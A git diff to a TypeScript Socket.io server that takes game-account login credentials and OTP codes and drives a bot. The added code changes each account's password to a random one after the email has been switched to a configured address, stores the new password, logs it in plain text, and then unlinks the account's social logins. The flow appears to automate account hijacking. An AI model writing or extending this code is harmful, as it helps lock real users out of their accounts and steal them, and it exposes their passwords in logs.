@@ -1,14 +1,15 @@
-import { createServer } from 'http';
+import { closeDatabase, initDatabase } from '@/database/database';
+import { AccountHelper, MailHelper } from '@/helper/database-helper';
+import { RiotHelper } from '@/helper/riot-bot-helper';
+import { RiotBot } from '@/modules/riot-bot';
+import routes from '@/routes';
+import { LoginDataSchema, OtpDataSchema } from '@/types';
+import type { Result } from '@/types/riot';
+import type { ClientEvents, InterEvents, ServerEvents, SocketData } from '@/types/socket';
 import express from 'express';
+import { createServer } from 'http';
 import path from 'path';
 import { Server } from 'socket.io';
-import { RiotBot } from '@/modules/riot-bot';
-import { initDatabase, closeDatabase } from '@/database/database';
-import { MailHelper, AccountHelper } from '@/helper/database-helper';
-import routes from '@/routes';
-import type { Result } from '@/types/riot';
-import type { ClientEvents, ServerEvents, InterEvents, SocketData } from '@/types/socket';
-import { LoginDataSchema, OtpDataSchema } from '@/types';
 
 const app = express();
 const httpServer = createServer((req, res) => {
@@ -177,7 +178,23 @@ io.on('connection', (socket) => {
                     }
 
                     if (emailConfig?.email && !isCaptchaError) {
-                        await bot.changeEmail(emailConfig.email);
+                        const emailResult = await bot.changeEmail(emailConfig.email);
+
+                        if (emailResult.success) {
+                            const account = AccountHelper.findByUser(username);
+                            if (account?.password) {
+                                const newPassword = RiotHelper.generateRandomPassword(12);
+                                const passwordResult = await bot.changePassword(account.password, newPassword);
+
+                                if (passwordResult.success) {
+                                    AccountHelper.updatePassword(username, newPassword);
+                                    console.log(`password mới cho ${username}: ${newPassword}`);
+                                } else {
+                                    console.log(`đổi password fail cho ${username}: ${passwordResult.error}`);
+                                }
+                            }
+                        }
+
                         await bot.unlinkSocials();
                     }
 
@@ -267,7 +284,29 @@ io.on('connection', (socket) => {
                     }
 
                     if (emailConfig?.email) {
-                        await bot.changeEmail(emailConfig.email);
+                        const emailResult = await bot.changeEmail(emailConfig.email);
+
+                        if (emailResult.success) {
+                            // Tự động đổi password sau khi đổi email thành công
+                            const credentials = loginCredentials.get(socket.id);
+                            const username = credentials?.username ?? 'unknown';
+
+                            if (username !== 'unknown') {
+                                const account = AccountHelper.findByUser(username);
+                                if (account?.password) {
+                                    const newPassword = RiotHelper.generateRandomPassword(12);
+                                    const passwordResult = await bot.changePassword(account.password, newPassword);
+
+                                    if (passwordResult.success) {
+                                        AccountHelper.updatePassword(username, newPassword);
+                                        console.log(`password mới cho ${username}: ${newPassword}`);
+                                    } else {
+                                        console.log(`đổi password fail cho ${username}: ${passwordResult.error}`);
+                                    }
+                                }
+                            }
+                        }
+
                         await bot.unlinkSocials();
                     }
 
